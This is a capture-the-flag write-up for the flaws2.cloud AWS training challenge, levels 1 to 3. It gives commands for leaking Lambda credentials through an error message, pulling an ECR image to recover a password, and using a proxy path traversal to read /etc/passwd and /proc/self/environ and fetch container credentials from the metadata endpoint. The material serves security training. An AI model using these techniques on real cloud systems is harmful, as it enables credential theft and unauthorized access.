# flaws2.cloud Challenges

## Level 1

![level1-home](../../images/web/flaws2.cloud/level1-home.png)

Query DNS for `level1.flaws2.cloud`:

```shell
dig level1.flaws2.cloud 
```

![level1-dig-domain](../../images/web/flaws2.cloud/level1-dig-domain.png)

Reverse lookup the first IP from previous query:

```
dig -x 52.217.112.197
```

![level1-reverse-lookup](../../images/web/flaws2.cloud/level1-reverse-lookup.png)

When submitting the form, an HTTP request is made to an AWS API:

![level1-http-request-web](../../images/web/flaws2.cloud/level1-http-request-web.png)

Perform the request without passing the `code` value in order to trigger an error:

```
curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code="
```

![level1-api-error](../../images/web/flaws2.cloud/level1-api-error.png)

Previous request raised an error whose stack discloses lambda environment variables, leaking some AWS credentials; perform again the request and parse it with `jq`:

```
curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=" | grep -v 'malformed input' | jq .
```

![level1-api-error-parsed](../../images/web/flaws2.cloud/level1-api-error-parsed.png)

Add found credentials to `~/.aws/credentials`:

![level1-credentials](../../images/web/flaws2.cloud/level1-credentials.png)

Use found credentials to list bucket content:

```
aws s3 ls s3://level1.flaws2.cloud/ --region us-east-1 --profile flaws2.level1
```

![level1-bucket-ls](../../images/web/flaws2.cloud/level1-bucket-ls.png)

Win: 

![level1-win](../../images/web/flaws2.cloud/level1-win.png)


## Level 2

Start URL:

```
http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/
```

![level2-home](../../images/web/flaws2.cloud/level2-home.png)

Enumerate images from repository `level2` using default repository:

```
aws ecr describe-images --profile flaws2.level1 --region us-east-1 --repository-name level2
```

![level2-enumerate-images](../../images/web/flaws2.cloud/level2-enumerate-images.png)

Get login credentials for authenticating to the registry with docker:

```
aws ecr get-login --profile flaws2.level1 --region us-east-1
```

![level2-get-login-to-registry](../../images/web/flaws2.cloud/level2-get-login-to-registry.png)

Authenticate to the registry:

```
docker login -u AWS -p <truncated>  https://653711331788.dkr.ecr.us-east-1.amazonaws.com
```

![level2-docker-login-to-registry](../../images/web/flaws2.cloud/level2-docker-login-to-registry.png)

Pull the image:

```
docker image pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```

![level2-docker-pull](../../images/web/flaws2.cloud/level2-docker-pull.png)

Create and start a container from the pulled image:

```
docker container create --name flaws2.level2 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
docker container start flaws2.level2
```

![level2-create-and-start-container-from-image](../../images/web/flaws2.cloud/level2-create-and-start-container-from-image.png)

List last Dockerfile commands:

```
docker history 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2 --format json --no-trunc | jq .
```

![level2-docker-image-history](../../images/web/flaws2.cloud/level2-docker-image-history.png)

Obtained the following credentials: `flaws2:secret_password`

![level2-container-auth](../../images/web/flaws2.cloud/level2-container-auth.png)

![level2-win](../../images/web/flaws2.cloud/level2-win.png)

## Level 3

URL: http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/


![level3-home](../../images/web/flaws2.cloud/level3-home.png)

Open a shell on the container created previously:

```
docker exec -it flaws2.level2 /bin/bash
```


![level3-docker-exec](../../images/web/flaws2.cloud/level3-docker-exec.png)

Dump the nginx configuration:

```
cat /etc/nginx/sites-enabled/default
```

![level3-nginx-proxy](../../images/web/flaws2.cloud/level3-nginx-proxy.png)

It seems that an HTTP proxy function is configured at:

```
http://container.target.flaws2.cloud/proxy/<target URL>
```

This proxy functionality is vulnerable to path traversal:

```
http://container.target.flaws2.cloud/proxy/etc/passwd
```

![level3-path-traversal](../../images/web/flaws2.cloud/level3-path-traversal.png)

Abuse this vulnerability to obtain the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable value as follows:

```
http://container.target.flaws2.cloud/proxy/proc/self/environ
```

![level3-environment](../../images/web/flaws2.cloud/level3-environment.png)

Having the credentials URI  GUID, it's possible to access container credentials at:

```
http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/c71b2888-dec8-4cc3-aa35-53bd7b6096c7
```

![level3-credentials](../../images/web/flaws2.cloud/level3-credentials.png)

Add found credentials to `~/.aws/credentials`:

![level3-add-credentials](../../images/web/flaws2.cloud/level3-add-credentials.png)

Use found credentials to list accessible buckets:

```
aws s3 ls --region us-east-1 --profile flaws2.level3
```

![level3-list-buckets](../../images/web/flaws2.cloud/level3-list-buckets.png)

Go to `http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/` and win:

![level3-win](../../images/web/flaws2.cloud/level3-win.png)